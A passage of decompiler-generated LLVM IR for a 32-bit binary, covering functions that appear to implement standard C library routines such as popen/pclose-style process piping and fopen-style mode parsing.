  store i32 %v0_804b624, i32* @ebp, align 4
  ret i32 %v0_804b6cf

; uselistorder directives
  uselistorder i32 %v0_804b67d, { 1, 0 }
  uselistorder i32 %v1_804b67d, { 1, 0 }
  uselistorder i32 %v1_804b677, { 1, 2, 0 }
  uselistorder i32 %v0_804b677, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0 }
  uselistorder label %dec_label_pc_804b6cc, { 1, 0 }
  uselistorder label %dec_label_pc_804b6c5, { 1, 0 }
  uselistorder label %dec_label_pc_804b67d, { 1, 0 }
}

define i32 @function_804b6d8(i32 %arg1) local_unnamed_addr {
dec_label_pc_804b6d8:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  store i32 %arg1, i32* @edi, align 4
  %v2_804b6ec = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804b6ec, i32* @eax, align 4
  store i32 %v2_804b6ec, i32* %stack_var_-60, align 4
  %v2_804b6f1 = call i32 @function_804ec6e(i32 %v2_804b6ec, i32 134540395)
  store i32 ptrtoint (i32* @global_var_8055e64.110 to i32), i32* %stack_var_-60, align 4
  %v1_804b6fd = call i32 @function_804ec6b(i32 ptrtoint (i32* @global_var_8055e64.110 to i32))
  %v0_804b702 = load i32, i32* @global_var_8055e7c.111, align 4
  store i32 %v0_804b702, i32* @ebx, align 4
  %v1_804b70b = icmp eq i32 %v0_804b702, 0
  br i1 %v1_804b70b, label %dec_label_pc_804b741, label %dec_label_pc_804b70f

dec_label_pc_804b70f:                             ; preds = %dec_label_pc_804b6d8
  %v1_804b70f = add i32 %v0_804b702, 4
  %v2_804b70f = inttoptr i32 %v1_804b70f to i32*
  %v3_804b70f = load i32, i32* %v2_804b70f, align 4
  %v4_804b70f = load i32, i32* @edi, align 4
  %v15_804b70f = icmp eq i32 %v3_804b70f, %v4_804b70f
  %v1_804b712 = icmp eq i1 %v15_804b70f, false
  br i1 %v1_804b712, label %dec_label_pc_804b730, label %dec_label_pc_804b714

dec_label_pc_804b714:                             ; preds = %dec_label_pc_804b70f
  %v1_804b714 = inttoptr i32 %v0_804b702 to i32*
  %v2_804b714 = load i32, i32* %v1_804b714, align 4
  store i32 %v2_804b714, i32* @global_var_8055e7c.111, align 4
  br label %dec_label_pc_804b741

dec_label_pc_804b71d:                             ; preds = %dec_label_pc_804b730
  %v0_804b71d = load i32, i32* %stack_var_-60, align 4
  %v1_804b71d = call i32 @function_804b4bc(i32 %v0_804b71d)
  %v1_804b722 = inttoptr i32 %v1_804b71d to i32*
  store i32 22, i32* %v1_804b722, align 4
  br label %dec_label_pc_804b741

dec_label_pc_804b72a:                             ; preds = %dec_label_pc_804b76d
  %v3_804b72a = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_804b78f

dec_label_pc_804b730:                             ; preds = %dec_label_pc_804b70f, %dec_label_pc_804b738
  %v1_804b73f = phi i32 [ %v2_804b732, %dec_label_pc_804b738 ], [ %v0_804b702, %dec_label_pc_804b70f ]
  %v1_804b732 = inttoptr i32 %v1_804b73f to i32*
  %v2_804b732 = load i32, i32* %v1_804b732, align 4
  store i32 %v2_804b732, i32* @ebx, align 4
  %v1_804b734 = icmp eq i32 %v2_804b732, 0
  br i1 %v1_804b734, label %dec_label_pc_804b71d, label %dec_label_pc_804b738

dec_label_pc_804b738:                             ; preds = %dec_label_pc_804b730
  %v1_804b738 = add i32 %v2_804b732, 4
  %v2_804b738 = inttoptr i32 %v1_804b738 to i32*
  %v3_804b738 = load i32, i32* %v2_804b738, align 4
  %v15_804b738 = icmp eq i32 %v3_804b738, %v4_804b70f
  %v1_804b73b = icmp eq i1 %v15_804b738, false
  br i1 %v1_804b73b, label %dec_label_pc_804b730, label %dec_label_pc_804b73d

dec_label_pc_804b73d:                             ; preds = %dec_label_pc_804b738
  %v1_804b73d = inttoptr i32 %v2_804b732 to i32*
  %v2_804b73d = load i32, i32* %v1_804b73d, align 4
  store i32 %v2_804b73d, i32* %v1_804b732, align 4
  br label %dec_label_pc_804b741

dec_label_pc_804b741:                             ; preds = %dec_label_pc_804b6d8, %dec_label_pc_804b71d, %dec_label_pc_804b714, %dec_label_pc_804b73d
  store i32 %v2_804b6ec, i32* @eax, align 4
  store i32 %v2_804b6ec, i32* %stack_var_-60, align 4
  %v2_804b74a = call i32 @function_804ec6e(i32 %v2_804b6ec, i32 1)
  %v0_804b752 = load i32, i32* @ebx, align 4
  %v1_804b752 = icmp eq i32 %v0_804b752, 0
  br i1 %v1_804b752, label %dec_label_pc_804b78c, label %dec_label_pc_804b756

dec_label_pc_804b756:                             ; preds = %dec_label_pc_804b741
  %v1_804b759 = add i32 %v0_804b752, 8
  %v2_804b759 = inttoptr i32 %v1_804b759 to i32*
  %v3_804b759 = load i32, i32* %v2_804b759, align 4
  store i32 %v3_804b759, i32* @esi, align 4
  store i32 %v0_804b752, i32* %stack_var_-60, align 4
  %v1_804b75d = call i32 @function_804e0e5(i32 %v0_804b752)
  store i32 %v1_804b75d, i32* @eax, align 4
  %v0_804b762 = load i32, i32* @edi, align 4
  store i32 %v0_804b762, i32* %stack_var_-60, align 4
  %v1_804b765 = inttoptr i32 %v0_804b762 to i16*
  %v2_804b765 = call i32 @function_804b4c4(i16* %v1_804b765)
  %v2_804b770 = ptrtoint i32* %stack_var_-16 to i32
  br label %dec_label_pc_804b76d

dec_label_pc_804b76d:                             ; preds = %dec_label_pc_804b782, %dec_label_pc_804b756
  %v0_804b76d = phi i32 [ %v1_804b782, %dec_label_pc_804b782 ], [ %v2_804b765, %dec_label_pc_804b756 ]
  %v0_804b775 = load i32, i32* @esi, align 4
  store i32 %v0_804b775, i32* %stack_var_-60, align 4
  %v4_804b776 = call i32 @function_804b448(i32 %v0_804b775, i32 %v2_804b770, i32 0, i32 %v0_804b76d)
  %v2_804b77e = icmp slt i32 %v4_804b776, 0
  %v1_804b780 = icmp eq i1 %v2_804b77e, false
  br i1 %v1_804b780, label %dec_label_pc_804b72a, label %dec_label_pc_804b782

dec_label_pc_804b782:                             ; preds = %dec_label_pc_804b76d
  %v0_804b782 = load i32, i32* %stack_var_-60, align 4
  %v1_804b782 = call i32 @function_804b4bc(i32 %v0_804b782)
  %v1_804b787 = inttoptr i32 %v1_804b782 to i32*
  %v2_804b787 = load i32, i32* %v1_804b787, align 4
  %v11_804b787 = icmp eq i32 %v2_804b787, 4
  br i1 %v11_804b787, label %dec_label_pc_804b76d, label %dec_label_pc_804b78c.loopexit

dec_label_pc_804b78c.loopexit:                    ; preds = %dec_label_pc_804b782
  br label %dec_label_pc_804b78c

dec_label_pc_804b78c:                             ; preds = %dec_label_pc_804b78c.loopexit, %dec_label_pc_804b741
  br label %dec_label_pc_804b78f

dec_label_pc_804b78f:                             ; preds = %dec_label_pc_804b72a, %dec_label_pc_804b78c
  %storemerge = phi i32 [ -1, %dec_label_pc_804b78c ], [ %v3_804b72a, %dec_label_pc_804b72a ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804b782, { 1, 0 }
  uselistorder i32 %v0_804b752, { 2, 1, 0, 3 }
  uselistorder i32 %v2_804b732, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v2_804b6ec, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 0, 6, 7 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder label %dec_label_pc_804b78f, { 1, 0 }
  uselistorder label %dec_label_pc_804b741, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804b730, { 1, 0 }
}

define i32 @function_804b796(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_804b796:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v15_804b798 = ptrtoint i32* %stack_var_-60 to i32
  %v4_804b79b = ptrtoint i8* %arg2 to i32
  store i32 %v4_804b79b, i32* @ebx, align 4
  %v2_804b79f = load i8, i8* %arg2, align 1
  %v10_804b7a1 = icmp eq i8 %v2_804b79f, 119
  br i1 %v10_804b7a1, label %dec_label_pc_804b7d0, label %dec_label_pc_804b7a5

dec_label_pc_804b7a5:                             ; preds = %dec_label_pc_804b796
  %v10_804b7ad = icmp eq i8 %v2_804b79f, 114
  br i1 %v10_804b7ad, label %dec_label_pc_804b7d0, label %dec_label_pc_804b7b1

dec_label_pc_804b7b1:                             ; preds = %dec_label_pc_804b7a5
  %v1_804b7b1 = call i32 @function_804b4bc(i32 1)
  %v1_804b7b6 = inttoptr i32 %v1_804b7b1 to i32*
  store i32 22, i32* %v1_804b7b6, align 4
  store i32 0, i32* %stack_var_-60, align 4
  br label %dec_label_pc_804b987

dec_label_pc_804b7d0:                             ; preds = %dec_label_pc_804b796, %dec_label_pc_804b7a5
  %v0_804b89e = phi i32 [ 1, %dec_label_pc_804b7a5 ], [ 0, %dec_label_pc_804b796 ]
  store i32 12, i32* %stack_var_-76, align 4
  %v1_804b7d5 = call i32 @function_804d73a(i32 12)
  %v1_804b7e1 = icmp eq i32 %v1_804b7d5, 0
  store i32 0, i32* %stack_var_-60, align 4
  br i1 %v1_804b7e1, label %dec_label_pc_804b987, label %dec_label_pc_804b7f0

dec_label_pc_804b7f0:                             ; preds = %dec_label_pc_804b7d0
  %v2_804b7f3 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_804b7f3, i32* %stack_var_-76, align 4
  %v1_804b7f8 = call i32 @function_804f364(i32 %v2_804b7f3)
  %v1_804b800 = icmp eq i32 %v1_804b7f8, 0
  %v1_804b802 = icmp eq i1 %v1_804b800, false
  br i1 %v1_804b802, label %dec_label_pc_804b970, label %dec_label_pc_804b808

dec_label_pc_804b808:                             ; preds = %dec_label_pc_804b7f0
  %tmp37 = sub nsw i32 0, %v0_804b89e
  %v2_804b80c = and i32 %tmp37, 4
  %v3_804b80c = add i32 %v15_804b798, 44
  %v4_804b80c = add i32 %v3_804b80c, %v2_804b80c
  %v5_804b80c = inttoptr i32 %v4_804b80c to i32*
  %v6_804b80c = load i32, i32* %v5_804b80c, align 4
  %v5_804b819 = xor i32 %v0_804b89e, 1
  %tmp38 = sub nsw i32 0, %v5_804b819
  %v2_804b81d = and i32 %tmp38, 4
  %v4_804b81d = add i32 %v3_804b80c, %v2_804b81d
  %v5_804b81d = inttoptr i32 %v4_804b81d to i32*
  %v6_804b81d = load i32, i32* %v5_804b81d, align 4
  %v0_804b825 = load i32, i32* @ecx, align 4
  %v0_804b827 = load i32, i32* @ebx, align 4
  store i32 %v6_804b81d, i32* %stack_var_-76, align 4
  %v5_804b829 = call i32 @function_804f56c(i32 %v6_804b81d, i32 %v0_804b827, i32 %v0_804b825, i32 %v0_804b825)
  store i32 %v5_804b829, i32* %stack_var_-60, align 4
  %v1_804b835 = icmp eq i32 %v5_804b829, 0
  %v1_804b837 = icmp eq i1 %v1_804b835, false
  br i1 %v1_804b837, label %dec_label_pc_804b854, label %dec_label_pc_804b839

dec_label_pc_804b839:                             ; preds = %dec_label_pc_804b808
  store i32 %v6_804b81d, i32* %stack_var_-76, align 4
  %v1_804b840 = call i32 @function_804b2bc(i32 %v6_804b81d)
  %v2_804b845 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_804b845, i32* %edx.global-to-local, align 4
  store i32 %v6_804b80c, i32* %stack_var_-76, align 4
  %v1_804b84a = call i32 @function_804b2bc(i32 %v6_804b80c)
  br label %dec_label_pc_804b96d

dec_label_pc_804b854:                             ; preds = %dec_label_pc_804b808
  %v2_804b85f = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804b85f, i32* @eax, align 4
  store i32 %v2_804b85f, i32* %stack_var_-76, align 4
  %v3_804b864 = call i32 @function_804ec6e(i32 %v2_804b85f, i32 134540395)
  store i32 ptrtoint (i32* @global_var_8055e64.110 to i32), i32* %stack_var_-76, align 4
  %v1_804b870 = call i32 @function_804ec6b(i32 ptrtoint (i32* @global_var_8055e64.110 to i32))
  %v0_804b875 = call i32 @function_804ef84()
  store i32 %v0_804b875, i32* @eax, align 4
  store i32 %v0_804b875, i32* @ebx, align 4
  %v1_804b87f = icmp eq i32 %v0_804b875, 0
  %v1_804b881 = icmp eq i1 %v1_804b87f, false
  br i1 %v1_804b881, label %dec_label_pc_804b8fb, label %dec_label_pc_804b883

dec_label_pc_804b883:                             ; preds = %dec_label_pc_804b854
  store i32 %v6_804b81d, i32* %stack_var_-76, align 4
  %v1_804b88a = call i32 @function_804b2bc(i32 %v6_804b81d)
  store i32 %v0_804b89e, i32* %edx.global-to-local, align 4
  %v15_804b896 = icmp eq i32 %v6_804b80c, %v0_804b89e
  br i1 %v15_804b896, label %dec_label_pc_804b8b5, label %dec_label_pc_804b89c

dec_label_pc_804b89c:                             ; preds = %dec_label_pc_804b883
  store i32 %v6_804b80c, i32* %stack_var_-76, align 4
  %v5_804b8a3 = call i32 @function_804f11c(i32 %v6_804b80c, i32 %v0_804b89e, i32 %v1_804b88a, i32 %v1_804b88a)
  store i32 %v6_804b80c, i32* %stack_var_-76, align 4
  %v1_804b8ad = call i32 @function_804b2bc(i32 %v6_804b80c)
  br label %dec_label_pc_804b8b5

dec_label_pc_804b8b5:                             ; preds = %dec_label_pc_804b883, %dec_label_pc_804b89c
  %v0_804b8b5 = load i32, i32* @global_var_8055e7c.111, align 4
  store i32 %v0_804b8b5, i32* @ebx, align 4
  %v1_804b8d02 = icmp eq i32 %v0_804b8b5, 0
  %v1_804b8d29 = icmp eq i1 %v1_804b8d02, false
  br i1 %v1_804b8d29, label %dec_label_pc_804b8bd, label %dec_label_pc_804b8d4

dec_label_pc_804b8bd:                             ; preds = %dec_label_pc_804b8b5, %dec_label_pc_804b8bd
  %v0_804b8bd = phi i32 [ %v2_804b8cb, %dec_label_pc_804b8bd ], [ %v0_804b8b5, %dec_label_pc_804b8b5 ]
  %v1_804b8bd = add i32 %v0_804b8bd, 4
  %v2_804b8bd = inttoptr i32 %v1_804b8bd to i32*
  %v3_804b8bd = load i32, i32* %v2_804b8bd, align 4
  %v1_804b8c3 = add i32 %v3_804b8bd, 4
  %v2_804b8c3 = inttoptr i32 %v1_804b8c3 to i32*
  %v3_804b8c3 = load i32, i32* %v2_804b8c3, align 4
  store i32 %v3_804b8c3, i32* %stack_var_-76, align 4
  %v1_804b8c6 = call i32 @function_804b2bc(i32 %v3_804b8c3)
  %v0_804b8cb = load i32, i32* @ebx, align 4
  %v1_804b8cb = inttoptr i32 %v0_804b8cb to i32*
  %v2_804b8cb = load i32, i32* %v1_804b8cb, align 4
  store i32 %v2_804b8cb, i32* @ebx, align 4
  %v1_804b8d0 = icmp eq i32 %v2_804b8cb, 0
  %v1_804b8d2 = icmp eq i1 %v1_804b8d0, false
  br i1 %v1_804b8d2, label %dec_label_pc_804b8bd, label %dec_label_pc_804b8d4

dec_label_pc_804b8d4:                             ; preds = %dec_label_pc_804b8bd, %dec_label_pc_804b8b5
  store i32 0, i32* %stack_var_-76, align 4
  %v8_804b8ec = call i32 @function_804e8ec(i32 ptrtoint ([8 x i8]* @global_var_8053003.114 to i32), i32 ptrtoint ([3 x i8]* @global_var_8053008.113 to i32), i32 ptrtoint ([3 x i8]* @global_var_8053000.112 to i32), i32 %arg1, i32 0)
  store i32 127, i32* %stack_var_-76, align 4
  %v1_804b8f6 = call i32 @function_804f0c0(i32 127)
  unreachable

dec_label_pc_804b8fb:                             ; preds = %dec_label_pc_804b854
  store i32 %v2_804b85f, i32* @esi, align 4
  store i32 %v2_804b85f, i32* %stack_var_-76, align 4
  %v3_804b904 = call i32 @function_804ec6e(i32 %v2_804b85f, i32 1)
  store i32 %v6_804b80c, i32* %stack_var_-76, align 4
  %v1_804b90e = call i32 @function_804b2bc(i32 %v6_804b80c)
  store i32 %v1_804b90e, i32* @eax, align 4
  %v0_804b916 = load i32, i32* @ebx, align 4
  %tmp40 = icmp slt i32 %v0_804b916, 1
  br i1 %tmp40, label %dec_label_pc_804b961, label %dec_label_pc_804b91a

dec_label_pc_804b91a:                             ; preds = %dec_label_pc_804b8fb
  store i32 %v1_804b7d5, i32* @eax, align 4
  %v2_804b91e = add i32 %v1_804b7d5, 8
  %v3_804b91e = inttoptr i32 %v2_804b91e to i32*
  store i32 %v0_804b916, i32* %v3_804b91e, align 4
  %v2_804b921 = load i32, i32* %stack_var_-60, align 4
  store i32 %v2_804b921, i32* %edx.global-to-local, align 4
  %v1_804b924 = load i32, i32* @eax, align 4
  %v2_804b924 = add i32 %v1_804b924, 4
  %v3_804b924 = inttoptr i32 %v2_804b924 to i32*
  store i32 %v2_804b921, i32* %v3_804b924, align 4
  store i32 %v2_804b85f, i32* %stack_var_-76, align 4
  %v3_804b933 = call i32 @function_804ec6e(i32 %v2_804b85f, i32 134540395)
  store i32 ptrtoint (i32* @global_var_8055e64.110 to i32), i32* %stack_var_-76, align 4
  %v1_804b93f = call i32 @function_804ec6b(i32 ptrtoint (i32* @global_var_8055e64.110 to i32))
  store i32 %v1_804b7d5, i32* %edx.global-to-local, align 4
  %v0_804b948 = load i32, i32* @global_var_8055e7c.111, align 4
  store i32 %v0_804b948, i32* @eax, align 4
  %v2_804b94d = inttoptr i32 %v1_804b7d5 to i32*
  store i32 %v0_804b948, i32* %v2_804b94d, align 4
  %v0_804b94f = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804b94f, i32* @global_var_8055e7c.111, align 4
  store i32 %v2_804b85f, i32* %stack_var_-76, align 4
  %v3_804b95a = call i32 @function_804ec6e(i32 %v2_804b85f, i32 1)
  %v2_804b987.pre.pre = load i32, i32* %stack_var_-60, align 4
  br label %dec_label_pc_804b984

dec_label_pc_804b961:                             ; preds = %dec_label_pc_804b8fb
  %v3_804b964 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_804b964, i32* %stack_var_-76, align 4
  %v1_804b968 = inttoptr i32 %v3_804b964 to i16*
  %v2_804b968 = call i32 @function_804b4c4(i16* %v1_804b968)
  br label %dec_label_pc_804b96d

dec_label_pc_804b96d:                             ; preds = %dec_label_pc_804b839, %dec_label_pc_804b961
  br label %dec_label_pc_804b970

dec_label_pc_804b970:                             ; preds = %dec_label_pc_804b7f0, %dec_label_pc_804b96d
  store i32 %v1_804b7d5, i32* %stack_var_-76, align 4
  %v1_804b977 = call i32 @function_804e0e5(i32 %v1_804b7d5)
  store i32 0, i32* %stack_var_-60, align 4
  br label %dec_label_pc_804b984

dec_label_pc_804b984:                             ; preds = %dec_label_pc_804b91a, %dec_label_pc_804b970
  %v2_804b987.pre = phi i32 [ %v2_804b987.pre.pre, %dec_label_pc_804b91a ], [ 0, %dec_label_pc_804b970 ]
  br label %dec_label_pc_804b987

dec_label_pc_804b987:                             ; preds = %dec_label_pc_804b7d0, %dec_label_pc_804b7b1, %dec_label_pc_804b984
  %v2_804b987 = phi i32 [ 0, %dec_label_pc_804b7d0 ], [ 0, %dec_label_pc_804b7b1 ], [ %v2_804b987.pre, %dec_label_pc_804b984 ]
  ret i32 %v2_804b987

; uselistorder directives
  uselistorder i32 %v0_804b916, { 1, 0 }
  uselistorder i32 %v2_804b8cb, { 1, 2, 0 }
  uselistorder i32 %v0_804b875, { 1, 0, 2 }
  uselistorder i32 %v2_804b85f, { 1, 0, 3, 2, 5, 4, 6, 8, 7, 9 }
  uselistorder i32 %v6_804b81d, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v6_804b80c, { 8, 7, 4, 3, 6, 5, 0, 2, 1 }
  uselistorder i32 %v2_804b7f3, { 1, 0 }
  uselistorder i32 %v1_804b7d5, { 5, 4, 1, 0, 3, 2, 6 }
  uselistorder i32 %v0_804b89e, { 1, 0, 4, 2, 3 }
  uselistorder i32* %stack_var_-60, { 1, 2, 0, 3, 4, 5, 6, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_8055e64.110 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804b987, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b984, { 1, 0 }
  uselistorder label %dec_label_pc_804b970, { 1, 0 }
  uselistorder label %dec_label_pc_804b96d, { 1, 0 }
  uselistorder label %dec_label_pc_804b8bd, { 1, 0 }
  uselistorder label %dec_label_pc_804b8b5, { 1, 0 }
  uselistorder label %dec_label_pc_804b7d0, { 1, 0 }
}

define i32 @function_804b990(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804b990:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804b990 = load i32, i32* @ebp, align 4
  %v0_804b991 = load i32, i32* @edi, align 4
  %v0_804b992 = load i32, i32* @esi, align 4
  %v0_804b993 = load i32, i32* @ebx, align 4
  store i32 %v0_804b993, i32* %stack_var_-16, align 4
  %v4_804b997 = ptrtoint i8* %arg2 to i32
  store i32 %v4_804b997, i32* @edx, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %v2_804b9a7 = load i8, i8* %arg2, align 1
  %v3_804b9a7 = zext i8 %v2_804b9a7 to i32
  %v4_804b9a7 = load i32, i32* @eax, align 4
  %v5_804b9a7 = and i32 %v4_804b9a7, -256
  %v6_804b9a7 = or i32 %v5_804b9a7, %v3_804b9a7
  store i32 %v6_804b9a7, i32* %eax.global-to-local, align 4
  %v10_804b9a9 = icmp eq i8 %v2_804b9a7, 114
  br i1 %v10_804b9a9, label %dec_label_pc_804b9eb, label %dec_label_pc_804b9ad

dec_label_pc_804b9ad:                             ; preds = %dec_label_pc_804b990
  store i32 577, i32* @ebx, align 4
  %v10_804b9b2 = icmp eq i8 %v2_804b9a7, 119
  br i1 %v10_804b9b2, label %dec_label_pc_804b9ed, label %dec_label_pc_804b9b6

dec_label_pc_804b9b6:                             ; preds = %dec_label_pc_804b9ad
  store i32 1089, i32* @ebx, align 4
  %v10_804b9ba = icmp eq i8 %v2_804b9a7, 97
  br i1 %v10_804b9ba, label %dec_label_pc_804b9ed, label %dec_label_pc_804b9be

dec_label_pc_804b9be:                             ; preds = %dec_label_pc_804ba66, %dec_label_pc_804ba40, %dec_label_pc_804b9b6
  %v0_804b9be = load i32, i32* %stack_var_-16, align 4
  %v1_804b9be = call i32 @function_804b4bc(i32 %v0_804b9be)
  store i32 %v1_804b9be, i32* %eax.global-to-local, align 4
  %v0_804b9c3 = load i32, i32* @ebp, align 4
  %v1_804b9c3 = icmp eq i32 %v0_804b9c3, 0
  %v1_804b9c5 = inttoptr i32 %v1_804b9be to i32*
  store i32 22, i32* %v1_804b9c5, align 4
  br i1 %v1_804b9c3, label %dec_label_pc_804bbb3, label %dec_label_pc_804b9d1

dec_label_pc_804b9d1:                             ; preds = %dec_label_pc_804ba8f, %dec_label_pc_804b9be
  %v0_804b9d1 = load i32, i32* @ebp, align 4
  %v1_804b9d1 = add i32 %v0_804b9d1, 1
  %v2_804b9d1 = inttoptr i32 %v1_804b9d1 to i8*
  %v3_804b9d1 = load i8, i8* %v2_804b9d1, align 1
  %v4_804b9d1 = and i8 %v3_804b9d1, 32
  %v5_804b9d1 = icmp eq i8 %v4_804b9d1, 0
  br i1 %v5_804b9d1, label %dec_label_pc_804bbb3, label %dec_label_pc_804b9db

dec_label_pc_804b9db:                             ; preds = %dec_label_pc_804b9d1
  store i32 %v0_804b9d1, i32* %stack_var_-76, align 4
  %v1_804b9df = call i32 @function_804e0e5(i32 %v0_804b9d1)
  store i32 %v1_804b9df, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804bbae

dec_label_pc_804b9eb:                             ; preds = %dec_label_pc_804b990
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804b9ed

dec_label_pc_804b9ed:                             ; preds = %dec_label_pc_804b9b6, %dec_label_pc_804b9ad, %dec_label_pc_804b9eb
  %v0_804b9fe = phi i32 [ 1089, %dec_label_pc_804b9b6 ], [ 577, %dec_label_pc_804b9ad ], [ 1, %dec_label_pc_804b9eb ]
  %v1_804b9ed = add i32 %v4_804b997, 1
  store i32 %v1_804b9ed, i32* %eax.global-to-local, align 4
  %v2_804b9f0 = inttoptr i32 %v1_804b9ed to i8*
  %v3_804b9f0 = load i8, i8* %v2_804b9f0, align 1
  %v12_804b9f0 = icmp eq i8 %v3_804b9f0, 98
  br i1 %v12_804b9f0, label %dec_label_pc_804b9f8, label %dec_label_pc_804b9f6

dec_label_pc_804b9f6:                             ; preds = %dec_label_pc_804b9ed
  store i32 %v4_804b997, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b9f8

dec_label_pc_804b9f8:                             ; preds = %dec_label_pc_804b9ed, %dec_label_pc_804b9f6
  %v0_804b9f8 = phi i32 [ %v1_804b9ed, %dec_label_pc_804b9ed ], [ %v4_804b997, %dec_label_pc_804b9f6 ]
  %v1_804b9f8 = add i32 %v0_804b9f8, 1
  %v2_804b9f8 = inttoptr i32 %v1_804b9f8 to i8*
  %v3_804b9f8 = load i8, i8* %v2_804b9f8, align 1
  %v12_804b9f8 = icmp eq i8 %v3_804b9f8, 43
  %v1_804b9fc = icmp eq i1 %v12_804b9f8, false
  br i1 %v1_804b9fc, label %dec_label_pc_804ba06, label %dec_label_pc_804b9fe

dec_label_pc_804b9fe:                             ; preds = %dec_label_pc_804b9f8
  store i32 %v0_804b9fe, i32* %eax.global-to-local, align 4
  %v1_804ba03 = add nuw nsw i32 %v0_804b9fe, 1
  store i32 %v1_804ba03, i32* @ebx, align 4
  br label %dec_label_pc_804ba06

dec_label_pc_804ba06:                             ; preds = %dec_label_pc_804b9f8, %dec_label_pc_804b9fe
  %v1_804ba06 = icmp eq i32 %arg3, 0
  %v1_804ba08 = icmp eq i1 %v1_804ba06, false
  br i1 %v1_804ba08, label %dec_label_pc_804ba3c, label %dec_label_pc_804ba0a

dec_label_pc_804ba0a:                             ; preds = %dec_label_pc_804ba06
  store i32 80, i32* %stack_var_-76, align 4
  %v1_804ba0f = call i32 @function_804d73a(i32 80)
  store i32 %v1_804ba0f, i32* %eax.global-to-local, align 4
  store i32 %v1_804ba0f, i32* @ebp, align 4
  %v2_804ba19 = icmp eq i32 %v1_804ba0f, 0
  br i1 %v2_804ba19, label %dec_label_pc_804bbb5, label %dec_label_pc_804ba21

dec_label_pc_804ba21:                             ; preds = %dec_label_pc_804ba0a
  %v2_804ba0f = inttoptr i32 %v1_804ba0f to i16*
  store i16 8192, i16* %v2_804ba0f, align 2
  %v2_804ba29 = add i32 %v1_804ba0f, 8
  %v3_804ba29 = inttoptr i32 %v2_804ba29 to i32*
  store i32 0, i32* %v3_804ba29, align 4
  %v2_804ba30 = add i32 %v1_804ba0f, 56
  store i32 %v2_804ba30, i32* %eax.global-to-local, align 4
  store i32 %v2_804ba30, i32* %stack_var_-76, align 4
  %v1_804ba34 = call i32 @function_804bc21(i32 %v2_804ba30)
  store i32 %v1_804ba34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ba3c

dec_label_pc_804ba3c:                             ; preds = %dec_label_pc_804ba06, %dec_label_pc_804ba21
  %v2_804ba3c = icmp slt i32 %arg4, 0
  br i1 %v2_804ba3c, label %dec_label_pc_804ba89, label %dec_label_pc_804ba40

dec_label_pc_804ba40:                             ; preds = %dec_label_pc_804ba3c
  %v0_804ba40 = load i32, i32* @ebx, align 4
  %v0_804ba42 = load i32, i32* @esi, align 4
  %v1_804ba42 = add i32 %v0_804ba42, 1
  store i32 %v1_804ba42, i32* %eax.global-to-local, align 4
  %v1_804ba45 = and i32 %v0_804ba40, 32771
  store i32 %v1_804ba45, i32* %edx.global-to-local, align 4
  %v1_804ba4b = load i32, i32* @ebp, align 4
  %v2_804ba4b = add i32 %v1_804ba4b, 4
  %v3_804ba4b = inttoptr i32 %v2_804ba4b to i32*
  store i32 %arg4, i32* %v3_804ba4b, align 4
  %v0_804ba4e = load i32, i32* %edx.global-to-local, align 4
  %v1_804ba4e = add i32 %v0_804ba4e, 1
  store i32 %v1_804ba4e, i32* @edx, align 4
  %v0_804ba4f = load i32, i32* %eax.global-to-local, align 4
  %v2_804ba4f = and i32 %v0_804ba4f, %v1_804ba4e
  store i32 %v2_804ba4f, i32* %eax.global-to-local, align 4
  %v12_804ba51 = icmp eq i32 %v2_804ba4f, %v1_804ba4e
  %v1_804ba53 = icmp eq i1 %v12_804ba51, false
  br i1 %v1_804ba53, label %dec_label_pc_804b9be, label %dec_label_pc_804ba59

dec_label_pc_804ba59:                             ; preds = %dec_label_pc_804ba40
  %v0_804ba59 = load i32, i32* @esi, align 4
  %v1_804ba5b = and i32 %v0_804ba59, 1024
  %v1_804ba5d = xor i32 %v1_804ba5b, 1024
  store i32 %v1_804ba5d, i32* %eax.global-to-local, align 4
  %v1_804ba62 = load i32, i32* @ebx, align 4
  %v2_804ba62 = and i32 %v1_804ba62, %v1_804ba5d
  %v3_804ba62 = icmp eq i32 %v2_804ba62, 0
  br i1 %v3_804ba62, label %dec_label_pc_804ba59.dec_label_pc_804ba7f_crit_edge, label %dec_label_pc_804ba66

dec_label_pc_804ba59.dec_label_pc_804ba7f_crit_edge: ; preds = %dec_label_pc_804ba59
  br label %dec_label_pc_804ba7f

dec_label_pc_804ba66:                             ; preds = %dec_label_pc_804ba59
  store i32 %arg4, i32* %stack_var_-76, align 4
